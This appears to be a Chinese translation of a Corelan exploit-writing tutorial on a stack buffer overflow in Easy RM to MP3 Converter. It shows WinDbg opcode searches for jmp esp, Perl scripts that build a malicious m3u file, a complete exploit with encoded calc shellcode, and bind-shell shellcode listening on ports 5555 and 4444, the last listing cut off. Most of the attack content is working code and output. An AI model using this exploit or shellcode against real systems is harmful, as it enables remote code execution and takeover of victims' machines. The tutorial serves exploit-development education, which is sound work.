<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">Microsoft (R) Windows Debugger Version 6.11.0001.404 X86</span><br><span class="line">Copyright (c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">*** wait with pending attach</span><br><span class="line">Symbol search path is: *** Invalid ***</span><br><span class="line">****************************************************************************</span><br><span class="line">* Symbol loading may be unreliable without a symbol search path.           *</span><br><span class="line">* Use .symfix to have the debugger choose a symbol path.                   *</span><br><span class="line">* After setting your symbol path, use .reload to refresh symbol locations. *</span><br><span class="line">****************************************************************************</span><br><span class="line">Executable search path is:</span><br><span class="line">ModLoad: 00400000 004be000   C:\Program Files\Easy RM to MP3 Converter\RM2MP3Converter.exe</span><br><span class="line">ModLoad: 7c900000 7c9b2000   C:\WINDOWS\system32\ntdll.dll</span><br><span class="line">ModLoad: 7c800000 7c8f6000   C:\WINDOWS\system32\kernel32.dll</span><br><span class="line">ModLoad: 78050000 78120000   C:\WINDOWS\system32\WININET.dll</span><br><span class="line">ModLoad: 77c10000 77c68000   C:\WINDOWS\system32\msvcrt.dll</span><br><span class="line">ModLoad: 77f60000 77fd6000   C:\WINDOWS\system32\SHLWAPI.dll</span><br><span class="line">ModLoad: 77dd0000 77e6b000   C:\WINDOWS\system32\ADVAPI32.dll</span><br><span class="line">ModLoad: 77e70000 77f02000   C:\WINDOWS\system32\RPCRT4.dll</span><br><span class="line">ModLoad: 77fe0000 77ff1000   C:\WINDOWS\system32\Secur32.dll</span><br><span class="line">ModLoad: 77f10000 77f59000   C:\WINDOWS\system32\GDI32.dll</span><br><span class="line">ModLoad: 7e410000 7e4a1000   C:\WINDOWS\system32\USER32.dll</span><br><span class="line">ModLoad: 00330000 00339000   C:\WINDOWS\system32\Normaliz.dll</span><br><span class="line">ModLoad: 78000000 78045000   C:\WINDOWS\system32\iertutil.dll</span><br><span class="line">ModLoad: 77c00000 77c08000   C:\WINDOWS\system32\VERSION.dll</span><br><span class="line">ModLoad: 73dd0000 73ece000   C:\WINDOWS\system32\MFC42.DLL</span><br><span class="line">ModLoad: 763b0000 763f9000   C:\WINDOWS\system32\comdlg32.dll</span><br><span class="line">ModLoad: 5d090000 5d12a000   C:\WINDOWS\system32\COMCTL32.dll</span><br><span class="line">ModLoad: 7c9c0000 7d1d7000   C:\WINDOWS\system32\SHELL32.dll</span><br><span class="line">ModLoad: 76080000 760e5000   C:\WINDOWS\system32\MSVCP60.dll</span><br><span class="line">ModLoad: 76b40000 76b6d000   C:\WINDOWS\system32\WINMM.dll</span><br><span class="line">ModLoad: 76390000 763ad000   C:\WINDOWS\system32\IMM32.DLL</span><br><span class="line">ModLoad: 773d0000 774d3000   C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.5512_x-ww_35d4ce83\comctl32.dll</span><br><span class="line">ModLoad: 74720000 7476c000   C:\WINDOWS\system32\MSCTF.dll</span><br><span class="line">ModLoad: 755c0000 755ee000   C:\WINDOWS\system32\msctfime.ime</span><br><span class="line">ModLoad: 774e0000 7761d000   C:\WINDOWS\system32\ole32.dll</span><br><span class="line">ModLoad: 10000000 10071000   C:\Program Files\Easy RM to MP3 Converter\MSRMfilter03.dll</span><br><span class="line">ModLoad: 71ab0000 71ac7000   C:\WINDOWS\system32\WS2_32.dll</span><br><span class="line">ModLoad: 71aa0000 71aa8000   C:\WINDOWS\system32\WS2HELP.dll</span><br><span class="line">ModLoad: 00ce0000 00d7f000   C:\Program Files\Easy RM to MP3 Converter\MSRMfilter01.dll</span><br><span class="line">ModLoad: 01a90000 01b01000   C:\Program Files\Easy RM to MP3 Converter\MSRMCcodec00.dll</span><br><span class="line">ModLoad: 00c80000 00c87000   C:\Program Files\Easy RM to MP3 Converter\MSRMCcodec01.dll</span><br><span class="line">ModLoad: 01b10000 01fdd000   C:\Program Files\Easy RM to MP3 Converter\MSRMCcodec02.dll</span><br><span class="line">ModLoad: 01fe0000 01ff1000   C:\WINDOWS\system32\MSVCIRT.dll</span><br><span class="line">ModLoad: 77120000 771ab000   C:\WINDOWS\system32\OLEAUT32.dll</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;如果我们可以发现属于这些 dll 其中一个的操作码，那么我们会有一个好的机会使 exploit 在所有 windows 平台都稳定。如果我们需要使用属于操作系统的 dll，那么我们可能会发现 exploit 在其他版本的操作系统中不起作用。所以首先让我们搜索 Easy RM to MP3 的某个 dll 的区域。</p>
<p>&emsp;&emsp;我们将查看  C:\Program Files\Easy RM to MP3 Converter\MSRMCcodec02.dll 的区域。这个 dll 在 01b10000 和 01fd000 中被加载。在这个区域寻找 ff e4：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0:014&gt; s 01b10000 l 01fdd000 ff e4</span><br><span class="line">01ccf23a  ff e4 ff 8d 4e 10 c7 44-24 10 ff ff ff ff e8 f3  ....N..D$.......</span><br><span class="line">01d0023f  ff e4 fb 4d 1b a6 9c ff-ff 54 a2 ea 1a d9 9c ff  ...M.....T......</span><br><span class="line">01d1d3db  ff e4 ca ce 01 20 05 93-19 09 00 00 00 00 d4 d1  ..... ..........</span><br><span class="line">01d3b22a  ff e4 07 07 f2 01 57 f2-5d 1c d3 e8 09 22 d5 d0  ......W.]....&quot;..</span><br><span class="line">01d3b72d  ff e4 09 7d e4 ad 37 df-e7 cf 25 23 c9 a0 4a 26  ...&#125;..7...%#..J&amp;</span><br><span class="line">01d3cd89  ff e4 03 35 f2 82 6f d1-0c 4a e4 19 30 f7 b7 bf  ...5..o..J..0...</span><br><span class="line">01d45c9e  ff e4 5c 2e 95 bb 16 16-79 e7 8e 15 8d f6 f7 fb  ..\.....y.......</span><br><span class="line">01d503d9  ff e4 17 b7 e3 77 31 bc-b4 e7 68 89 bb 99 54 9d  .....w1...h...T.</span><br><span class="line">01d51400  ff e4 cc 38 25 d1 71 44-b4 a3 16 75 85 b9 d0 50  ...8%.qD...u...P</span><br><span class="line">01d5736d  ff e4 17 b7 e3 77 31 bc-b4 e7 68 89 bb 99 54 9d  .....w1...h...T.</span><br><span class="line">01d5ce34  ff e4 cc 38 25 d1 71 44-b4 a3 16 75 85 b9 d0 50  ...8%.qD...u...P</span><br><span class="line">01d60159  ff e4 17 b7 e3 77 31 bc-b4 e7 68 89 bb 99 54 9d  .....w1...h...T.</span><br><span class="line">01d62ec0  ff e4 cc 38 25 d1 71 44-b4 a3 16 75 85 b9 d0 50  ...8%.qD...u...P</span><br><span class="line">0221135b  ff e4 49 20 02 e8 49 20-02 00 00 00 00 ff ff ff  ..I ..I ........</span><br><span class="line">0258ea53  ff e4 ec 58 02 00 00 00-00 00 00 00 00 08 02 a8  ...X............</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;太棒了。（我没有期待出现其他情况，因为 jmp esp 是一个非常常见的指令）。当选择这个地址时，寻找空字节是十分重要的。你应该尝试避免使用空字节地址（特别是你需要使用来自覆盖 EIP 之后的 buffer 数据。空字节将会成为字符串终止符并且其他 buffer 数据将变得不能被使用）</p>
<p>&emsp;&emsp;另一个好的搜索操作码的区域是：</p>
<p>&emsp;&emsp;“s 70000000 | ffffffff ff e4”（通常会给出来自 windows dll 的结果）</p>
<p>&emsp;&emsp;注意：还有其他方法获得操作码地址：</p>
<ul>
<li>findjmp（来自 Ryan Permeh）：编译 findjmp.c 并且使用以下参数运行：</li>
</ul>
<blockquote>
<p>findjmp .  Suppose you want to look for jumps to esp in kernel32.dll, run  “findjmp kernel32.dll esp”</p>
<p>On Vista SP2, you should get something like this :</p>
<p><em>Findjmp, Eeye, I2S-LaB</em></p>
<p><em>Findjmp2, Hat-Squad</em></p>
<p>Scanning kernel32.dll for code useable with the esp register</p>
<p>0x773AF74B      call esp</p>
<p>Finished Scanning kernel32.dll for code useable with the esp register</p>
<p>Found 1 usable addresses</p>
</blockquote>
<ul>
<li><a href="http://www.metasploit.org/users/opcode/msfopcode.cgi" target="_blank" rel="noopener">Metasploit 操作码数据库</a></li>
<li>memdunp（详情见下一篇教程）</li>
<li>pvefindaddr，一个 Immunity Debugger 的插件。事实上，这是最受推荐的方式，因为它将自动过滤不稳定的指针</li>
</ul>
<p>&emsp;&emsp;因为我们想要将我们的 shellcode 放置到 ESP 中（在覆盖 EIP 之后，放置我们的 payload），列表里的 jmp esp 必须没有空字节。如果这个地址有空字节，我们将用一个包含空字节的地址覆盖 EIP。空字节作用为一个终止符，所以后面的被忽略了。在一些情况下，以有一个空字节开始的的地址将会有效。如果地址开始于一个空字节，因为从小到大的模式，这个空字节将是 EIP 寄存器的最后个字节。并且如果你在覆盖 EIP 后没有发送如何 payload（所以如果 shellcode 在覆盖 EIP 之前添加，它仍然可以通过寄存器访问），那么将会有效。</p>
<p>&emsp;&emsp;不管怎样，我们将使用覆盖 EIP 后的 payload 来托管我们的 shellcode，所以这个地址不应该包含空字节。</p>
<p>&emsp;&emsp;第一个尝试的地址：0x01ccf23a</p>
<p>&emsp;&emsp;验证此地址是否包含 jmp sep（因此在 01ccf23a 中将指令解汇编）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0:014&gt; u 01ccf23a</span><br><span class="line">MSRMCcodec02!CAudioOutWindows::WaveOutWndProc+0x8bfea:</span><br><span class="line">01ccf23a ffe4            jmp     esp</span><br><span class="line">01ccf23c ff8d4e10c744    dec     dword ptr +0x44c7104d (44c7104e)[ebp]</span><br><span class="line">01ccf242 2410            and     al,10h</span><br><span class="line">01ccf244 ff              ???</span><br><span class="line">01ccf245 ff              ???</span><br><span class="line">01ccf246 ff              ???</span><br><span class="line">01ccf247 ff              ???</span><br><span class="line">01ccf248 e8f3fee4ff      call    MSRMCcodec02!CTN_WriteHead+0xd320 (01b1f140)</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;如果我们现在使用 0x01ccf23a 覆盖 EIP，jmp esp 将会被执行。ESP 包含我们的shellcode，所以我们现在有了一个有效的 exploit。让我们使用“Nop &amp; break”测试。</p>
<p>&emsp;&emsp;关闭 windbg。</p>
<p>&emsp;&emsp;使用下面的脚本创建一个新的 m3u 文件：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">my</span> $file= <span class="string">"test1.m3u"</span>;</span><br><span class="line"><span class="keyword">my</span> $junk= <span class="string">"A"</span> <span class="keyword">x</span> <span class="number">26094</span>;</span><br><span class="line"><span class="keyword">my</span> $eip = <span class="keyword">pack</span>(<span class="string">'V'</span>,<span class="number">0x01ccf23a</span>);  </span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $shellcode = <span class="string">"\x90"</span> <span class="keyword">x</span> <span class="number">25</span>; </span><br><span class="line"></span><br><span class="line">$shellcode = $shellcode.<span class="string">"\xcc"</span>;  <span class="comment">#this will cause the application to break, simulating shellcode, but allowing you to further debug</span></span><br><span class="line">$shellcode = $shellcode.<span class="string">"\x90"</span> <span class="keyword">x</span> <span class="number">25</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">open</span>($FILE,<span class="string">"&gt;$file"</span>);</span><br><span class="line"><span class="keyword">print</span> $FILE $junk.$eip.$shellcode;</span><br><span class="line"><span class="keyword">close</span>($FILE);</span><br><span class="line"><span class="keyword">print</span> <span class="string">"m3u File Created successfully\n"</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;再次运行这个程序，连接至 windbg，按下“g”让它续运行，然后在这个程序内打开新的 m3u 文件。</p>
<p>&emsp;&emsp;现在程序在我们的第一个的崩溃地址 000ff745 处崩溃。所以 jmp esp 正常的运行了（esp 开始于 000ff730。但是不包含 NOPs 一直到 000ff744）。</p>
<p>&emsp;&emsp;现在我们需要做的是 放入我们真正的 shellcode 然后完成这个 exploit。</p>
<p>&emsp;&emsp;再次关闭 windbg。</p>
<hr>
<h3 id="获取-shellcode-然后完成-exploit"><a href="#获取-shellcode-然后完成-exploit" class="headerlink" title="获取 shellcode 然后完成 exploit"></a>获取 shellcode 然后完成 exploit</h3><p>&emsp;&emsp;Metasploit 有一个很好的 payload 生成器，将会帮助你构造 shellcode。Payload 有多种选择，并且可大可小（取决于目的是什么）。如果在缓冲区空间方面存在大小限制，那么你甚至可能希望查看多级 shellcode。或者使用特别手工制作的 shellcode  比如<a href="http://packetstormsecurity.org/shellcode/23bytes-shellcode.txt" target="_blank" rel="noopener">这个</a>（XP SP2 英文版下的23字节的 cmd.exe 的 shellcode）。或者，你可以<a href="http://code.google.com/p/w32-seh-omelet-shellcode/" target="_blank" rel="noopener">你可以分割你的 shellcode 放入更小的“鸡蛋”里</a>并且在执行 shellcode 之前，使用一种被称为 ”猎蛋（egg-hunting）“的技术来重新组装它。教程第八部分以及第十部分将深入讨论。</p>
<p>&emsp;&emsp;假设我们想让计算器作为我们的 exploit payload，那么 shellcode 应该是这样的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># windows/exec - 144 bytes</span><br><span class="line"># http://www.metasploit.com</span><br><span class="line"># Encoder: x86/shikata_ga_nai</span><br><span class="line"># EXITFUNC=seh, CMD=calc</span><br><span class="line">my $shellcode = &quot;\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1&quot; .</span><br><span class="line">&quot;\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30&quot; .</span><br><span class="line">&quot;\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa&quot; .</span><br><span class="line">&quot;\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96&quot; .</span><br><span class="line">&quot;\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b&quot; .</span><br><span class="line">&quot;\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a&quot; .</span><br><span class="line">&quot;\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83&quot; .</span><br><span class="line">&quot;\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98&quot; .</span><br><span class="line">&quot;\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61&quot; .</span><br><span class="line">&quot;\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05&quot; .</span><br><span class="line">&quot;\x7f\xe8\x7b\xca&quot;;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;完成 perl 脚本，然后尝试：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Exploit for Easy RM to MP3 27.3.700 vulnerability, discovered by Crazy_Hacker</span></span><br><span class="line"><span class="comment"># Written by Peter Van Eeckhoutte</span></span><br><span class="line"><span class="comment"># http://www.corelan.be</span></span><br><span class="line"><span class="comment"># Greetings to Saumil and SK :-)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># tested on Windows XP SP3 (En)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">my</span> $file= <span class="string">"exploitrmtomp3.m3u"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $junk= <span class="string">"A"</span> <span class="keyword">x</span> <span class="number">26094</span>;</span><br><span class="line"><span class="keyword">my</span> $eip = <span class="keyword">pack</span>(<span class="string">'V'</span>,<span class="number">0x01ccf23a</span>);  <span class="comment">#jmp esp from MSRMCcodec02.dll</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $shellcode = <span class="string">"\x90"</span> <span class="keyword">x</span> <span class="number">25</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># windows/exec - 144 bytes</span></span><br><span class="line"><span class="comment"># http://www.metasploit.com</span></span><br><span class="line"><span class="comment"># Encoder: x86/shikata_ga_nai</span></span><br><span class="line"><span class="comment"># EXITFUNC=seh, CMD=calc</span></span><br><span class="line">$shellcode = $shellcode . <span class="string">"\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1"</span> .</span><br><span class="line"><span class="string">"\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30"</span> .</span><br><span class="line"><span class="string">"\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa"</span> .</span><br><span class="line"><span class="string">"\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96"</span> .</span><br><span class="line"><span class="string">"\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b"</span> .</span><br><span class="line"><span class="string">"\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a"</span> .</span><br><span class="line"><span class="string">"\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83"</span> .</span><br><span class="line"><span class="string">"\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98"</span> .</span><br><span class="line"><span class="string">"\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61"</span> .</span><br><span class="line"><span class="string">"\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05"</span> .</span><br><span class="line"><span class="string">"\x7f\xe8\x7b\xca"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">open</span>($FILE,<span class="string">"&gt;$file"</span>);</span><br><span class="line"><span class="keyword">print</span> $FILE $junk.$eip.$shellcode;</span><br><span class="line"><span class="keyword">close</span>($FILE);</span><br><span class="line"><span class="keyword">print</span> <span class="string">"m3u File Created successfully\n"</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;首先，关闭 autopopup 注册表设置，防止调试器接管。创建 m3u文件，打开它然后看程序崩溃（然后 计算器也会被打开）。</p>
<p>&emsp;&emsp;完成！我们有了第一个有效的 exploit！</p>
<figure class="image-box">
                <img src="https://www.corelan.be/wp-content/uploads/2009/07/image_thumb14.png" alt="image" title class>
                <p>image</p>
            </figure>

<blockquote>
<p>你可能已经注意到，我在 shellcode 前保留了 25个 NOP（0x90）.现在不要想太多，随着你继续学习 exploit（以及当你到达关于编写 shellcode 的章节时），你将了解为什么需要这样做。</p>
</blockquote>
<hr>
<h3 id="如果你想做一些其他的事而不是启动计算器？"><a href="#如果你想做一些其他的事而不是启动计算器？" class="headerlink" title="如果你想做一些其他的事而不是启动计算器？"></a>如果你想做一些其他的事而不是启动计算器？</h3><p>&emsp;&emsp;你可以创建其他的 shellcode 并且使用新的 shellcode 来替换 “启动计算器” shellcode，但是代码可能不会很好的运行，因为这个 shellcode 可能更大，内存位置可能不同，并且更长的 shellcode 会增加 shellcode 中 无效字符的风险，这些字符需要过滤掉。</p>
<p>&emsp;&emsp;假设我们希望漏洞绑定到端口，以便远程黑客能够连接并且获得命令行。</p>
<p>&emsp;&emsp;shellcode 应该是这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># windows/shell_bind_tcp - 344 bytes</span><br><span class="line"># http://www.metasploit.com</span><br><span class="line"># Encoder: x86/shikata_ga_nai</span><br><span class="line"># EXITFUNC=seh, LPORT=5555, RHOST=</span><br><span class="line">&quot;\x31\xc9\xbf\xd3\xc0\x5c\x46\xdb\xc0\xd9\x74\x24\xf4\x5d&quot; .</span><br><span class="line">&quot;\xb1\x50\x83\xed\xfc\x31\x7d\x0d\x03\x7d\xde\x22\xa9\xba&quot; .</span><br><span class="line">&quot;\x8a\x49\x1f\xab\xb3\x71\x5f\xd4\x23\x05\xcc\x0f\x87\x92&quot; .</span><br><span class="line">&quot;\x48\x6c\x4c\xd8\x57\xf4\x53\xce\xd3\x4b\x4b\x9b\xbb\x73&quot; .</span><br><span class="line">&quot;\x6a\x70\x0a\xff\x58\x0d\x8c\x11\x91\xd1\x16\x41\x55\x11&quot; .</span><br><span class="line">&quot;\x5c\x9d\x94\x58\x90\xa0\xd4\xb6\x5f\x99\x8c\x6c\x88\xab&quot; .</span><br><span class="line">&quot;\xc9\xe6\x97\x77\x10\x12\x41\xf3\x1e\xaf\x05\x5c\x02\x2e&quot; .</span><br><span class="line">&quot;\xf1\x60\x16\xbb\x8c\x0b\x42\xa7\xef\x10\xbb\x0c\x8b\x1d&quot; .</span><br><span class="line">&quot;\xf8\x82\xdf\x62\xf2\x69\xaf\x7e\xa7\xe5\x10\x77\xe9\x91&quot; .</span><br><span class="line">&quot;\x1e\xc9\x1b\x8e\x4f\x29\xf5\x28\x23\xb3\x91\x87\xf1\x53&quot; .</span><br><span class="line">&quot;\x16\x9b\xc7\xfc\x8c\xa4\xf8\x6b\xe7\xb6\x05\x50\xa7\xb7&quot; .</span><br><span class="line">&quot;\x20\xf8\xce\xad\xab\x86\x3d\x25\x36\xdc\xd7\x34\xc9\x0e&quot; .</span><br><span class="line">&quot;\x4f\xe0\x3c\x5a\x22\x45\xc0\x72\x6f\x39\x6d\x28\xdc\xfe&quot; .</span><br><span class="line">&quot;\xc2\x8d\xb1\xff\x35\x77\x5d\x15\x05\x1e\xce\x9c\x88\x4a&quot; .</span><br><span class="line">&quot;\x98\x3a\x50\x05\x9f\x14\x9a\x33\x75\x8b\x35\xe9\x76\x7b&quot; .</span><br><span class="line">&quot;\xdd\xb5\x25\x52\xf7\xe1\xca\x7d\x54\x5b\xcb\x52\x33\x86&quot; .</span><br><span class="line">&quot;\x7a\xd5\x8d\x1f\x83\x0f\x5d\xf4\x2f\xe5\xa1\x24\x5c\x6d&quot; .</span><br><span class="line">&quot;\xb9\xbc\xa4\x17\x12\xc0\xfe\xbd\x63\xee\x98\x57\xf8\x69&quot; .</span><br><span class="line">&quot;\x0c\xcb\x6d\xff\x29\x61\x3e\xa6\x98\xba\x37\xbf\xb0\x06&quot; .</span><br><span class="line">&quot;\xc1\xa2\x75\x47\x22\x88\x8b\x05\xe8\x33\x31\xa6\x61\x46&quot; .</span><br><span class="line">&quot;\xcf\x8e\x2e\xf2\x84\x87\x42\xfb\x69\x41\x5c\x76\xc9\x91&quot; .</span><br><span class="line">&quot;\x74\x22\x86\x3f\x28\x84\x79\xaa\xcb\x77\x28\x7f\x9d\x88&quot; .</span><br><span class="line">&quot;\x1a\x17\xb0\xae\x9f\x26\x99\xaf\x49\xdc\xe1\xaf\x42\xde&quot; .</span><br><span class="line">&quot;\xce\xdb\xfb\xdc\x6c\x1f\x67\xe2\xa5\xf2\x98\xcc\x22\x03&quot; .</span><br><span class="line">&quot;\xec\xe9\xed\xb0\x0f\x27\xee\xe7&quot;;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;正如你所看到的，shellcode 的长度为 344字节（启动计算器只需要 144字节）。</p>
<p>&emsp;&emsp;如果你只是复制粘贴这个 shellcode，你可能会看到这个有漏洞的程序不会再崩溃。</p>
<figure class="image-box">
                <img src="https://www.corelan.be/wp-content/uploads/2009/07/image_thumb15.png" alt="image" title class>
                <p>image</p>
            </figure>



<p>&emsp;&emsp;这很可能表明 shellcode 缓冲区大小有问题（但是你可以测试缓冲区大小，你会注意到不是这个问题）。或者我们在 shellcode 中使用了无效的字符。在使用 Metasploit 构建 shellcode 时，可以排除无效字符，但是必须知道哪些字符是被允许的，哪些是不被允许的。默认情况下，空字符是受限制的（因为他们肯定会破坏 exploit），但是其他字符是什么？</p>
<p>&emsp;&emsp;m3u 文件应该包含文件名。因此一个好的开始是过滤掉文件和文件路径中不被运行的所有字符。你还可以使用另一个解码器来限制整个字符集。我们已经使用了 shikata_ga_nai，但是可能 alpha_upper 更适合文件名。使用另一种编码方式很可能会增加 shellcode 的长度，但是我们已经知道（或者我们可以模拟）大小不是一个大问题。</p>
<p>&emsp;&emsp;让我们尝试使用 alpha_upper 编码器构建一个 tcp shell bind shellcode，我们将一个 shell 绑定到本地端口 4444，新的 shellcode 的长度是 703字节。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># windows/shell_bind_tcp - 703 bytes</span><br><span class="line"># http://www.metasploit.com</span><br><span class="line"># Encoder: x86/alpha_upper</span><br><span class="line"># EXITFUNC=seh, LPORT=4444, RHOST=</span><br><span class="line">&quot;\x89\xe1\xdb\xd4\xd9\x71\xf4\x58\x50\x59\x49\x49\x49\x49&quot; .</span><br><span class="line">&quot;\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56&quot; .</span><br><span class="line">&quot;\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41&quot; .</span><br><span class="line">&quot;\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42&quot; .</span><br><span class="line">&quot;\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x42&quot; .</span><br><span class="line">&quot;\x4a\x4a\x4b\x50\x4d\x4b\x58\x4c\x39\x4b\x4f\x4b\x4f\x4b&quot; .</span><br><span 